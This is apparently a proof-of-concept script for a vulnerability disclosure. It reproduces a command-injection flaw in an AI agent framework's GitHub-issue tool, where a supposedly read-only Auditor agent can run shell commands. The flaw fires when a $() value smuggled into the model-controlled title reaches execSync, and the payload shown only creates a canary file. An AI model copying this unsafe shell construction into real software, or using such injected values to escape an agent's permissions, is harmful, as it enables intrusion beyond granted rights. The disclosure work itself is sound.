// Faithful reproduction of crewly create_github_issue.execute() shell construction
// (packages/crewly-agent/src/runtime/auditor-tools.ts, v1.20.470 commit 537cf52).
// The Auditor agent is documented read-only "without any ability to modify system state"
// and has NO bash tool. This shows a benign $() payload in the model-controlled `title`
// executes a shell command anyway. Payload only creates a canary file.
import { execSync } from 'node:child_process';

function create_github_issue({ title, body, labels }) {   // == the tool's execute()
  try {
    const searchQuery = title.replace(/\[.*?\]\s*/, '').slice(0, 50);
    try {
      execSync(`gh issue list --state open --search "${searchQuery.replace(/"/g, '\\"')}" --json number,title --limit 5`,
        { encoding: 'utf-8', timeout: 15000 });
    } catch { /* gh not available or no repo — but $() already ran */ }
    const labelFlag = labels.map(l => `--label "${l}"`).join(' ');
    execSync(`gh issue create --title "${title.replace(/"/g, '\\"')}" --body "${body.replace(/"/g, '\\"')}" ${labelFlag}`,
      { encoding: 'utf-8', timeout: 30000 });
  } catch (e) {
    console.log('  (gh invocation failed, expected: no gh/network in sandbox —', String(e.message||e).split('\n')[0].slice(0,60), ')');
  }
}

const malicious = 'x$(touch /work/CANARY_PWNED)y';          // benign canary payload
const benign    = 'Normal issue title, no injection';
console.log('[case 1] malicious title =', JSON.stringify(malicious));
create_github_issue({ title: malicious, body: 'b', labels: ['bug'] });
console.log('[case 2] benign title    =', JSON.stringify(benign));
create_github_issue({ title: benign, body: 'b', labels: ['bug'] });
